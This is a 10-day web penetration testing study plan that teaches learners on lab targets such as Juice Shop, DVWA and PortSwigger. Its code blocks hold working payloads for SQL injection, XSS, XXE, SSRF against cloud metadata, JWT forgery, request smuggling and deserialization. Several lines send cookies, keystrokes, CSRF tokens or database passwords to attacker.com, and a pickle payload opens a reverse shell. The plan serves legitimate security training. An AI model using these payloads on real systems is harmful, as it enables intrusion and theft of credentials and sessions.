# Advanced \& Realistic 10-Day Web Application Penetration Testing Study Plan

**Target Audience:** Cybersecurity professionals with basic security knowledge
**Study Time:** 4-5 hours per day
**Approach:** Combines foundational basics with advanced techniques and real-world methodology

---

## Table of Contents

- [Pre-Day 0: Essential Setup](#pre-day-0-essential-setup)
- [Day 1: Foundations + Reconnaissance Deep Dive](#day-1-foundations--reconnaissance-deep-dive)
- [Day 2: SQL Injection (Basic to Advanced)](#day-2-sql-injection-basic-to-advanced)
- [Day 3: Cross-Site Scripting (Basic to Advanced)](#day-3-cross-site-scripting-basic-to-advanced)
- [Day 4: Authentication \& Authorization Attacks](#day-4-authentication--authorization-attacks)
- [Day 5: IDOR, Access Control \& Business Logic](#day-5-idor-access-control--business-logic)
- [Day 6: API Security \& GraphQL](#day-6-api-security--graphql)
- [Day 7: SSRF, XXE, \& Deserialization](#day-7-ssrf-xxe--deserialization)
- [Day 8: Advanced Topics \& Real-World Chains](#day-8-advanced-topics--real-world-chains)
- [Day 9: Tool Mastery \& Automation](#day-9-tool-mastery--automation)
- [Day 10: Capstone CTF \& Reporting](#day-10-capstone-ctf--reporting)
- [Continuous Learning Path](#continuous-learning-path)
- [Progress Tracker](#progress-tracker)

---

## Pre-Day 0: Essential Setup

**Time Required:** 2-3 hours
**Complete this before starting Day 1**

### Environment Setup

#### Install Kali Linux / Ubuntu Security Tools

Update system

sudo apt update \&\& sudo apt upgrade -y
Install essential tools

sudo apt install -y nmap nikto sqlmap gobuster ffuf wfuzz john hydra metasploit-framework
Install web-specific tools

sudo apt install -y subfinder amass nuclei httpx waybackurls gau
Install Docker for vulnerable apps

sudo apt install docker.io docker-compose
sudo usermod -aG docker \$USER

text

#### Browser Extensions

- Burp Suite / ZAP Proxy
- FoxyProxy Standard
- Wappalyzer
- Cookie Editor
- HackTools
- JWT Debugger


#### Vulnerable Labs Setup

Core vulnerable applications

docker pull bkimminich/juice-shop
docker pull vulnerables/web-dvwa
docker pull erev0s/vampi
docker pull webpwnized/mutillidae
Run Juice Shop

docker run -d -p 3000:3000 bkimminich/juice-shop
Run DVWA

docker run -d -p 80:80 vulnerables/web-dvwa

text

#### Account Creation

- HackTheBox (free account): [https://www.hackthebox.com](https://www.hackthebox.com)
- PortSwigger Academy (free): [https://portswigger.net/web-security](https://portswigger.net/web-security)
- PentesterLab (free tier): [https://pentesterlab.com](https://pentesterlab.com)
- TryHackMe (optional, free tier): [https://tryhackme.com](https://tryhackme.com)
- GitHub (for note-taking repository): [https://github.com](https://github.com)

---

## Day 1: Foundations + Reconnaissance Deep Dive

**Study Time:** 4-5 hours

### Morning: HTTP Protocol \& Web Architecture (2 hours)

#### Basic Concepts

- Client-server model, DNS resolution, CDNs
- HTTP/1.1 vs HTTP/2 vs HTTP/3
- Headers, methods, status codes, cookies, sessions
- Same-Origin Policy (SOP), CORS, CSP


#### Advanced Concepts

- HTTP request smuggling fundamentals
- Cache poisoning basics
- WebSocket protocol security
- Server-Side Events (SSE) vulnerabilities


#### Resources

- MDN Web Docs: HTTP Complete Guide
- PortSwigger: HTTP Request Smuggling
- PortSwigger Web Security Academy


### Afternoon: Advanced Reconnaissance (3 hours)

#### Passive Recon (OSINT)

Subdomain enumeration (aggressive approach)

subfinder -d target.com -o subs.txt
amass enum -passive -d target.com -o amass_subs.txt
assetfinder --subs-only target.com | tee assetfinder_subs.txt
Merge and resolve

cat *_subs.txt | sort -u | httpx -silent -o live_subs.txt
Historical data

echo "target.com" | waybackurls | tee wayback_urls.txt
echo "target.com" | gau --blacklist png,jpg,gif,css | tee gau_urls.txt
Parameter discovery from historical data

cat wayback_urls.txt | grep "?" | uro | tee params.txt
Technology fingerprinting

whatweb target.com -v

#### Active Recon

Port scanning

nmap -sV -sC -p- target.com -oN nmap_full.txt
Directory/file brute-forcing (advanced wordlists)

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-u [https://target.com/FUZZ](https://target.com/FUZZ)
-mc 200,301,302,401,403
-o ffuf_dirs.json
Virtual host discovery

ffuf -w /path/to/vhosts.txt -u [https://target.com](https://target.com) -H "Host: FUZZ.target.com"
Parameter fuzzing

ffuf -w /path/to/params.txt -u [https://target.com/page?FUZZ=test](https://target.com/page?FUZZ=test)

text

#### JavaScript Analysis

Extract JS files

cat live_subs.txt | subjs | tee js_files.txt
Analyze JS for secrets, endpoints, parameters

python3 LinkFinder.py -i [https://target.com/app.js](https://target.com/app.js) -o endpoints.html
Secret scanning

trufflehog filesystem . --json | jq

text

### Practical Lab

- Complete Juice Shop: "Score Board", "Exposed Metrics", "Privacy Policy"
- PortSwigger Lab: Information Disclosure vulnerabilities (5 labs)
- Document reconnaissance findings in a structured note (Obsidian/Notion/GitHub)


### Today's Checklist

- [ ] Understand HTTP protocol in depth
- [ ] Set up reconnaissance tools
- [ ] Complete 5+ subdomain enumeration techniques
- [ ] Analyze JavaScript files for endpoints
- [ ] Complete 5+ PortSwigger labs

---

## Day 2: SQL Injection (Basic to Advanced)

**Study Time:** 4-5 hours

### Morning: SQL Injection Fundamentals (2 hours)

#### Basic Types

- Error-based SQLi
- Union-based SQLi
- Boolean-based Blind SQLi
- Time-based Blind SQLi


#### Manual Testing Workflow

1. Detection

' OR '1'='1
" OR "1"="1
') OR ('1'='1
2. Determine columns

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (until error)
3. UNION exploitation

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
4. Extract data

' UNION SELECT username,password,NULL FROM users--

text

### Afternoon: Advanced SQL Injection (3 hours)

#### Out-of-Band (OOB) SQLi

DNS exfiltration (SQLi via DNS)

'; EXEC master..xp_dirtree '\\attacker.com\share'--
HTTP exfiltration

'; DECLARE @data varchar(max);
SELECT @data = (SELECT TOP 1 password FROM users);
EXEC('master..xp_cmdshell ''powershell -c Invoke-WebRequest -Uri http://attacker.com/?data='+@data+'''')--

text

#### Second-Order SQLi

- Input stored in DB, exploited later in different context
- Test user profile updates, comment systems, search history


#### NoSQL Injection

// MongoDB injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}

// Test in JSON APIs
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}

text

#### SQLMap Advanced Usage

Authenticated scanning

sqlmap -u "http://target.com/page?id=1"
--cookie="PHPSESSID=abc123"
--level=5 --risk=3
--technique=BEUSTQ
--threads=10
--batch
Tamper scripts for WAF bypass

sqlmap -u "http://target.com/page?id=1"
--tamper=space2comment,between
--random-agent
Second-order SQLi

sqlmap -u "http://target.com/profile"
--data="bio=test"
--second-url="http://target.com/view-profile"

text

### Practical Lab

- PortSwigger SQL Injection: All 18 labs (including blind and advanced)
- DVWA: SQL Injection (Low, Medium, High, Impossible)
- Juice Shop: "Login Admin", "User Credentials", "Christmas Special"
- HTB: Easy SQL injection box (e.g., "Templated")


### Today's Checklist

- [ ] Master manual SQL injection detection
- [ ] Complete UNION-based exploitation
- [ ] Practice blind SQLi techniques
- [ ] Learn SQLMap advanced features
- [ ] Complete 18 PortSwigger labs

---

## Day 3: Cross-Site Scripting (Basic to Advanced)

**Study Time:** 4-5 hours

### Morning: XSS Fundamentals (2 hours)

#### Three Types

- Reflected XSS
- Stored XSS
- DOM-based XSS


#### Basic Payloads

<script>alert(1)</script> <img src=x onerror=alert(1)> <svg onload=alert(1)> <iframe src="javascript:alert(1)"> ```
Afternoon: Advanced XSS Techniques (3 hours)
Filter Bypass Techniques

text
// Encoding bypass

```
<script>alert(String.fromCharCode(88,83,83))</script>
```

// Case manipulation
<ScRiPt>alert(1)</sCrIpT>

// Event handler abuse
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

// HTML entity encoding
<script>alert(1)</script>

// JavaScript protocol
<a href="javascript:alert(1)">click</a>

// Polyglot XSS
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e

Mutation XSS (mXSS)

text

<!-- Browser parses differently than sanitizer -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

Blind XSS

text
// Payload sent to admin panel/backend
<script src="https://yourserver.com/xss.js"></script>

// On yourserver.com/xss.js:
document.location='https://yourserver.com/steal?cookie='+document.cookie;

DOM XSS Exploitation

text
// Analyze JS source for sinks
document.write(location.hash.substring(1));

// Exploit:
https://target.com/page\#<img src=x onerror=alert(1)>

XSS to Account Takeover

text
// Session hijacking
fetch('https://attacker.com/log?c='+document.cookie);

// CSRF token stealing
fetch('/api/csrf-token')
.then(r => r.text())
.then(token => fetch('https://attacker.com/log?csrf='+token));

// Keylogging
document.onkeypress = function(e) {
fetch('https://attacker.com/log?key='+e.key);
}

Practical Lab

    PortSwigger XSS: All 30+ labs (including context-specific, filter bypass, CSP)
    
    DVWA: XSS (all levels)
    
    Juice Shop: "DOM XSS", "Reflected XSS", "Bonus Payload", "Client-side XSS Protection"
    
    XSS Game by Google: All 6 levels
    
    HTB: Box with XSS to RCE chain
    Today's Checklist

    Understand all three XSS types
    
    Master filter bypass techniques
    
    Practice mutation XSS
    
    Learn blind XSS exploitation
    
    Complete 30+ PortSwigger labs

---
## Day 4: Authentication \& Authorization Attacks

**Study Time:** 4-5 hours

### Morning: Authentication Flaws (2 hours)

#### Username Enumeration

**Timing-based enumeration**

```bash
ffuf -w usernames.txt -u https://target.com/login \
  -X POST -d "username=FUZZ&password=invalid" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "Invalid credentials"
```

**Response difference**

```text
# Valid user: "Incorrect password"
# Invalid user: "User not found"
```


#### Password Brute-Force

```bash
# Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Burp Intruder with Pitchfork attack (user:pass pairs)
```


#### Rate Limiting Bypass

```http
# IP rotation via headers
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
```

```text
# Null byte bypass
username=admin%00&password=test

# Race condition
# Send multiple requests simultaneously
```


### Afternoon: Advanced Authentication Attacks (3 hours)

#### JWT Attacks

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Test for vulnerabilities
python3 jwt_tool.py <JWT_TOKEN>

# Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py <JWT> -X k -pk public.pem

# None algorithm
python3 jwt_tool.py <JWT> -X n

# Weak secret brute-force
python3 jwt_tool.py <JWT> -C -d /path/to/secrets.txt

# Kid injection
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S
```


#### OAuth/SAML Attacks

```text
# Open redirect via redirect_uri
https://provider.com/oauth/authorize?redirect_uri=https://attacker.com

# Token leakage
# Check if access token exposed in Referer header

# Pre-account takeover
# Register with victim email before they verify
```


#### 2FA/MFA Bypass

```text
# Direct request bypass
# Login -> 2FA page -> Try directly accessing /dashboard

# Response manipulation
POST /verify-otp
{"code": "123456", "verified": false}
# Change verified to true in intercepted response

# Rate limiting on OTP
# Brute-force 6-digit codes (000000-999999)

# Backup codes reuse
# Test if backup codes can be reused multiple times

# Remember device bypass
# Steal "remember_device" token

# Session fixation
# Use same session before and after 2FA
```


#### Password Reset Vulnerabilities

```text
# Token predictability
# Collect multiple reset tokens, analyze for patterns

# Token not expiring
# Use old tokens after password change

# Host header injection
POST /reset-password
Host: attacker.com
# Reset link points to attacker.com

# Parameter pollution
email=victim@target.com&email=attacker@evil.com
```


### Practical Lab

- PortSwigger Authentication: All 15 labs (including 2FA bypass, JWT attacks)[^1]
- PortSwigger OAuth: All 7 labs[^1]
- Juice Shop: "Login Bender", "Reset Bjoern's Password", "Login Jim", "JWT Issues"
- HTB: "Manager" box (password spraying + privilege escalation)


### Today's Checklist

- [ ] Master username enumeration techniques
- [ ] Practice JWT exploitation
- [ ] Learn 2FA/MFA bypass methods
- [ ] Understand OAuth vulnerabilities
- [ ] Complete 22 PortSwigger labs

***

## Day 5: IDOR, Access Control \& Business Logic

**Study Time:** 4-5 hours

### Morning: IDOR Fundamentals (2 hours)

#### Identification

```text
# Numeric IDs
/api/user/123
/api/user/124  # try other user IDs

# UUIDs
/api/documents/550e8400-e29b-41d4-a716-446655440000
# Try to predict or enumerate UUIDs

# Encoded IDs
/api/order/dXNlcjEyMw==  # base64: user123
# Decode, modify, re-encode

# Hashed IDs
/api/profile/5f4dcc3b5aa765d61d8327deb882cf99  # MD5: password
# Attempt hash reversal or dictionary attack
```


#### Testing Methodology

- Create two accounts (user A, user B)
- Identify all ID parameters
- As user A, access user B's resources
- Test: GET, POST, PUT, DELETE, PATCH methods
- Check for vertical privilege escalation (user → admin)


### Afternoon: Advanced Access Control \& Business Logic (3 hours)

#### Horizontal Privilege Escalation

```text
# Parameter pollution
/api/profile?uid=123&uid=456

# Array manipulation
{"userids": [123, 456]}  # Access multiple users

# Wildcard abuse
/api/users/*
/api/users/all
```


#### Vertical Privilege Escalation

```text
# Method override
POST /api/user/123
X-HTTP-Method-Override: DELETE

# Role manipulation
{"username": "victim", "role": "admin"}

# Path traversal in API
/api/v1/users/../../admin/panel
```


#### Business Logic Flaws

**Race Conditions:**

```python
# Example: Transfer money race condition
import requests
import threading

def transfer():
    requests.post('https://target.com/transfer',
                  data={'to': 'attacker', 'amount': 1000},
                  cookies={'session': 'user_session'})

# Fire 10 simultaneous requests
threads = [threading.Thread(target=transfer) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

**Price Manipulation:**

```json
// Intercept checkout request
{"items": [
  {"id": 123, "price": 100, "quantity": 1}
]}

// Change to negative or zero
{"items": [
  {"id": 123, "price": -100, "quantity": 1}
]}
```

**Workflow Bypass:**

```text
# Skip verification steps
1. Registration -> 2. Email Verify -> 3. Activate

# Try: 1. Registration -> 3. Activate (skip step 2)
```


### Practical Lab

- PortSwigger Access Control: All 13 labs[^1]
- PortSwigger Business Logic: All 11 labs[^1]
- Juice Shop: "View Basket", "Forged Coupon", "Manipulate Basket", "Admin Registration"
- HTB Academy: "Business Logic Vulnerabilities" module


### Today's Checklist

- [ ] Master IDOR identification
- [ ] Practice horizontal privilege escalation
- [ ] Learn race condition exploitation
- [ ] Understand business logic flaws
- [ ] Complete 24 PortSwigger labs

***

## Day 6: API Security \& GraphQL

**Study Time:** 4-5 hours

### Morning: REST API Fundamentals (2 hours)

#### OWASP API Security Top 10[^2][^3]

- Broken Object Level Authorization (BOLA/IDOR)
- Broken Authentication
- Broken Object Property Level Authorization
- Unrestricted Resource Consumption
- Broken Function Level Authorization
- Unrestricted Access to Sensitive Business Flows
- Server Side Request Forgery (SSRF)
- Security Misconfiguration
- Improper Inventory Management
- Unsafe Consumption of APIs


#### API Enumeration

```bash
# Find API endpoints
gospider -s https://target.com -o output
cat output/* | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*api*" | sort -u

# API documentation discovery
ffuf -w /path/to/api-docs.txt -u https://target.com/FUZZ
# Common: /api/docs, /api/swagger.json, /api/openapi.json, /graphql

# Extract endpoints from JS
python3 LinkFinder.py -i https://target.com/app.js -o api-endpoints.html
```


### Afternoon: Advanced API \& GraphQL Attacks (3 hours)

#### Mass Assignment

```json
// Normal registration
POST /api/register
{"username": "attacker", "email": "test@test.com"}

// Try adding privileged fields
POST /api/register
{"username": "attacker", "email": "test@test.com", "role": "admin", "verified": true}
```


#### API Versioning Abuse

```text
# Test old API versions with weaker security
/api/v1/users  # old, vulnerable
/api/v2/users  # current
/api/v3/users  # beta

# Check if old versions still work and lack newer security
```


#### GraphQL Introspection

```graphql
# Discover schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```


#### GraphQL Injection \& Exploitation

```graphql
# IDOR via GraphQL
{
  user(id: "123") {
    email
    password
    creditCard
  }
}

# Change id to access other users
{
  user(id: "124") {
    email
    password
  }
}

# Batching attack (bypass rate limiting)
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  ...
  user1000: user(id: "1000") { email }
}

# Alias-based DoS
query {
  a1: users { ... }
  a2: users { ... }
  # ... repeat 1000 times
}
```


#### GraphQL Tools

```bash
# InQL Scanner (Burp extension)

# Graphw00f (fingerprint GraphQL)
python3 main.py -d -f -t https://target.com/graphql

# GraphQL Cop (security audit)
python3 graphql-cop.py -t https://target.com/graphql
```


### Practical Lab

- VAmPI: All challenges
- DVWA: API-related modules
- PortSwigger API Testing: All labs[^1]
- HTB: "OpenSource" box (API exploitation)
- Damn Vulnerable GraphQL Application


### Today's Checklist

- [ ] Learn OWASP API Top 10[^3][^2]
- [ ] Master GraphQL introspection
- [ ] Practice API enumeration
- [ ] Exploit mass assignment
- [ ] Complete VAmPI challenges


[^1]: https://portswigger.net/web-security/all-labs

[^2]: https://owasp.org/API-Security/editions/2023/en/0x11-t10/

[^3]: https://owasp.org/www-project-api-security/


---

## Day 7: SSRF, XXE, \& Deserialization

**Study Time:** 4-5 hours

### Morning: Server-Side Request Forgery (2 hours)

#### Basic SSRF

**Internal service access**

```text
http://localhost/admin
http://127.0.0.1:8080/admin
http://169.254.169.254/latest/meta-data/  # AWS metadata
```


#### URL bypass techniques

```text
http://127.1/admin              # shorthand for 127.0.0.1
http://[::1]/admin              # IPv6 localhost
http://2130706433/admin         # decimal IP
http://0x7f000001/admin         # hex IP
```


#### Blind SSRF

```bash
# Use Burp Collaborator or interactsh
curl https://oast.live/burpcollaborator  # Get unique subdomain

# Test SSRF
https://target.com/check-url?url=http://unique-id.oastify.com

# Monitor for DNS/HTTP callbacks
```


#### Cloud Metadata Exploitation

**AWS**

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**Azure**

```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
```

**GCP**

```text
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
```


### Afternoon: XXE \& Deserialization (3 hours)

#### XML External Entity (XXE)

**Basic file read**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Out-of-band XXE**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
```

**xxe.dtd content:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```


#### Deserialization Attacks

**PHP Object Injection:**

```php
// Vulnerable code
<?php
class User {
    public $name;
    public function __destruct() {
        file_put_contents($this->name, "hacked");
    }
}
unserialize($_GET['data']);

// Exploit
O:4:"User":1:{s:4:"name";s:10:"/tmp/pwned";}
```

**Java Deserialization:**

```bash
# ysoserial tool
java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64

# Inject serialized payload into vulnerable parameter
```

**Python Pickle:**

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('nc attacker.com 4444 -e /bin/bash',))

payload = pickle.dumps(Evil())
print(payload)
```


### Practical Lab

- PortSwigger SSRF: All 7 labs[^1]
- PortSwigger XXE: All 9 labs[^1]
- PortSwigger Deserialization: All 10 labs[^1]
- HTB: "Poison" box (PHP deserialization)


### Today's Checklist

- [ ] Master SSRF exploitation
- [ ] Learn cloud metadata attacks
- [ ] Practice XXE injection
- [ ] Understand deserialization flaws
- [ ] Complete 26 PortSwigger labs

***

## Day 8: Advanced Topics \& Real-World Chains

**Study Time:** 4-5 hours

### Morning: HTTP Request Smuggling \& Cache Poisoning (2 hours)

#### CL.TE Request Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```


#### TE.CL Request Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```


#### Cache Poisoning

```http
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If cached, victims receive:
<script src="https://evil.com/malicious.js"></script>
```


### Afternoon: Exploit Chaining \& Bug Bounty Tactics (3 hours)

#### Realistic Attack Chains

**Chain 1: Self-XSS → CSRF → Account Takeover**

1. Find self-XSS in profile bio
2. Combine with CSRF to make victim add malicious bio
3. XSS triggers when admin views profile
4. Steal admin session

**Chain 2: IDOR → SSRF → RCE**

1. IDOR exposes internal API endpoints
2. Use SSRF to access internal admin panel
3. Exploit deserialization vulnerability for RCE

**Chain 3: Open Redirect → OAuth Token Theft**

1. Find open redirect: `/redirect?url=https://evil.com`
2. Use in OAuth flow: `redirect_uri=https://target.com/redirect?url=https://evil.com`
3. Victim's OAuth token sent to attacker

#### Bug Bounty Methodology

**Step 1: Asset Discovery (1 hour)**

```bash
# Comprehensive subdomain enum
subfinder -d target.com | httpx | nuclei -t ~/nuclei-templates/
```

**Step 2: Focused Testing (2 hours)**

- Target specific functionality: auth, file upload, payment, admin panels
- Prioritize high-impact vulns: SQLi, RCE, IDOR, Auth bypass

**Step 3: Low-Hanging Fruit (30 min)**

```bash
# Quick wins
nuclei -u https://target.com -t exposures/,cves/
```


### Practical Lab

- PortSwigger HTTP Request Smuggling: 5+ labs[^1]
- PortSwigger Web Cache Poisoning: 5+ labs[^1]
- HTB Pro Labs: "RastaLabs" or "Offshore"
- Practice chaining on retired HTB boxes


### Today's Checklist

- [ ] Learn request smuggling
- [ ] Practice cache poisoning
- [ ] Build exploit chains
- [ ] Study bug bounty methodology
- [ ] Complete 10+ advanced labs

***

## Day 9: Tool Mastery \& Automation

**Study Time:** 4-5 hours

### Morning: Burp Suite Pro Features (2 hours)

#### Intruder Advanced

- Pitchfork vs Cluster Bomb attacks
- Resource pools for rate limiting
- Grep extract for token handling
- Recursive grep for multi-step attacks


#### Scanner Optimization

- Custom scan configurations
- Active scan++ extension
- Selective passive scanning
- JavaScript analysis[^2]


#### Macros \& Session Handling

- Multi-step authentication
- CSRF token refresh
- Dynamic session management


### Afternoon: Automation \& Scripting (3 hours)

#### Bash Reconnaissance Script

```bash
#!/bin/bash
domain=$1

echo "[*] Starting recon on $domain"

# Subdomains
subfinder -d $domain -silent | tee subs.txt
cat subs.txt | httpx -silent -o live.txt

# URLs
cat live.txt | waybackurls | tee urls.txt
cat urls.txt | gf xss | tee xss_params.txt

# Nuclei scan
nuclei -l live.txt -t ~/nuclei-templates/ -o nuclei_results.txt

# JS analysis
cat live.txt | subjs | tee js_files.txt

echo "[+] Recon complete!"
```


#### Python Custom Exploit

```python
import requests
import concurrent.futures

def test_sqli(payload):
    url = f"https://target.com/search?q={payload}"
    try:
        r = requests.get(url, timeout=5)
        if "SQL syntax" in r.text:
            print(f"[+] SQLi found: {payload}")
            return payload
    except:
        pass
    return None

payloads = ["'", "1' OR '1'='1", "1' AND '1'='2"]

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(test_sqli, payloads)

print("\n[*] Testing complete!")
```


### Practical Lab

- Build custom recon automation
- Create exploit scripts for previous days' vulns
- Set up continuous monitoring with nuclei cron jobs


### Today's Checklist

- [ ] Master Burp Suite advanced features[^2]
- [ ] Build reconnaissance automation
- [ ] Create custom exploit scripts
- [ ] Learn session handling techniques
- [ ] Build reusable toolkit

***

## Day 10: Capstone CTF \& Reporting

**Study Time:** 4-5 hours

### Morning: Full Penetration Test (3 hours)

**Target:** OWASP Mutillidae II or Juice Shop (Advanced Challenges)[^3]

**Methodology:**

1. Recon (30 min): Map entire application
2. Vulnerability Assessment (1 hour): Identify all vulns
3. Exploitation (1 hour): Prove impact with PoCs
4. Documentation (30 min): Screenshot everything

#### Report Structure

- Executive Summary
- Scope \& Methodology
- Findings (High to Low):
    - Title
    - Risk Rating (CVSS)
    - Description
    - Steps to Reproduce
    - Proof of Concept
    - Impact
    - Remediation
- Conclusion


### Afternoon: CTF Practice \& Portfolio Building (3 hours)

#### Platforms

- HackTheBox: "Easy" web machines (5 boxes)[^1]
- TryHackMe: OWASP Top 10 room
- PentesterLab: "Essential" badge challenges
- PortSwigger Mystery Lab Challenge[^1]


#### Portfolio Building

```bash
# Create GitHub repo for notes
git init web-app-pentest-notes
cd web-app-pentest-notes

# Structure:
# /notes/day-1-recon.md
# /scripts/sqli-scanner.py
# /reports/juice-shop-assessment.pdf
# /cheatsheets/burp-shortcuts.md

git add .
git commit -m "10-day study plan complete"
git push origin main
```


### Today's Checklist

- [ ] Complete full pentest assessment
- [ ] Write professional report
- [ ] Solve 5+ HTB web boxes
- [ ] Build GitHub portfolio
- [ ] Document all learnings

***

## Continuous Learning Path

### Week 2-4: Specialization

- Choose: Bug Bounty OR Enterprise Pentesting OR Red Team
- Deep dive into chosen path
- Complete 10+ HTB boxes in specialty


### Month 2-3: Certification Prep

- BSCP (Burp Suite Certified Practitioner)[^2]
- eWPT (eLearnSecurity Web Pentester)
- OSWE (Offensive Security Web Expert) - Advanced


### Month 4+: Real-World Practice

- Join bug bounty programs (HackerOne, Bugcrowd)[^4]
- Contribute to open-source security tools
- Write blog posts/tutorials
- Participate in CTF competitions

***

## Essential Resources Library

### Tools Repository

```bash
# Clone all essential tools
git clone https://github.com/ffuf/ffuf
git clone https://github.com/projectdiscovery/nuclei
git clone https://github.com/sqlmapproject/sqlmap
git clone https://github.com/ticarpi/jwt_tool
```


### Reading Materials

- "The Web Application Hacker's Handbook" (classic)
- "Real-World Bug Hunting" by Peter Yaworski
- "Bug Bounty Bootcamp" by Vickie Li
- OWASP Testing Guide v4.2[^5][^3]


### Video Channels

- Rana Khalil (PortSwigger walkthroughs)
- InsiderPhD (Bug bounty basics)
- PwnFunction (Concept explanations)
- LiveOverflow (Advanced techniques)
- John Hammond (CTF walkthroughs)


### Communities

- HackerOne Discord[^4]
- Bug Bounty Forum
- Reddit: r/bugbounty, r/netsec
- Twitter: \#bugbountytips, \#infosec

***

## Progress Tracker

### Daily Checklist Template

```markdown
## Day X: [Topic]

### Learning Objectives
- [ ] Concept 1
- [ ] Concept 2
- [ ] Concept 3

### Practical Labs Completed
- [ ] PortSwigger Labs: X/Y
- [ ] Juice Shop: Challenge 1, 2, 3
- [ ] HTB Box: [Name]

### Notes & Key Takeaways
- 

### Challenges Faced
- 

### Tomorrow's Prep
- 
```


***

## Summary

This 10-day plan provides:

- Foundational knowledge for beginners
- Advanced techniques for experienced professionals
- Real-world methodology from bug bounty hunters[^6][^7]
- Hands-on practice with vulnerable applications[^3][^1]
- Tool mastery with Burp Suite and custom scripts[^2]
- Portfolio building for career advancement

**Total Lab Count:**

- PortSwigger: 150+ labs (cumulative across categories)[^1]
- Juice Shop: 50+ challenges
- HTB Boxes: 10+ machines
- Custom vulnerable apps: 5+ platforms

**Good luck with your penetration testing journey!** 🔥

<div align="center">⁂</div>

[^1]: https://portswigger.net/web-security/all-labs

[^2]: https://portswigger.net/burp/documentation/scanner

[^3]: https://owasp.org/www-project-web-security-testing-guide/

[^4]: https://www.hackerone.com/knowledge-center/ultimate-9-point-website-security-checklist

[^5]: https://owasp.org/www-project-web-security-testing-guide/v42/

[^6]: https://www.stackhawk.com/blog/understanding-the-2023-owasp-top-10-api-security-risks/

[^7]: https://www.veracode.com/blog/breaking-down-owasp-top-10-api-security-risks-2023-what-changed-2019/

